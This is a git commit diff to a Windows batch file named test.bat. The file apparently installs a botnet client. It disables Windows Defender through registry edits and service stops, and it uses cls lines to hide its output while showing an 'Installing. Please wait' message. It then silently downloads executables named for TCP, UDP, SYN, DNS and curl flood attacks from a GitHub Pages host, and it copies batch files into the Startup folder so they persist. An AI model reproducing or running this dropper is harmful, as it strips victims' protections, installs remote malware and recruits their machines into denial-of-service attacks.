2383410e4a6a2dba2546e56fd45cdcb5cd45add9
Abrissy <132929073+Abrissyy@users.noreply.github.com>
2024-07-19 13:16:54 +0000

    Update test.bat

--- test.bat
+++ test.bat
@@ -3,15 +3,17 @@ cd C:\Users\%username%\AppData
 mkdir FirewallManager 
 cd FirewallManager
 color a
+cls
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+cls
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+cls
 net stop WinDefend
+cls
 net start WinDefend
 cls 
 echo "Installing. Please wait"
 curl -OJL --silent https://abrissyy.github.io/goodreps/bot/client.exe
-curl -OJL --silent https://abrissyy.github.io/goodreps/bot/get.exe 
-curl -OJL --silent https://abrissyy.github.io/goodreps/bot/post.exe 
 curl -OJL --silent https://abrissyy.github.io/goodreps/bot/tcp.exe 
 curl -OJL --silent https://abrissyy.github.io/goodreps/bot/udp.exe 
 curl -OJL --silent https://abrissyy.github.io/goodreps/bot/curl_flood.exe
@@ -21,7 +23,7 @@ curl -OJL --silent https://abrissyy.github.io/goodreps/bot/syn.exe
 curl -OJL --silent https://abrissyy.github.io/goodreps/bot/informator.exe
 curl -OJL --silent https://raw.githubusercontent.com/Abrissyy/goodreps/main/bot/setup.bat
 curl -OJL --silent https://abrissyy.github.io/goodreps/bot/dns.exe
-echo start C:\Users\%username%\AppData\FirewallManager\informator.exe >Informator.bat
+curl -OJL --silent https://abrissyy.github.io/goodreps/bot/informator.bat
 xcopy /y setup.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 xcopy /y Informator.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
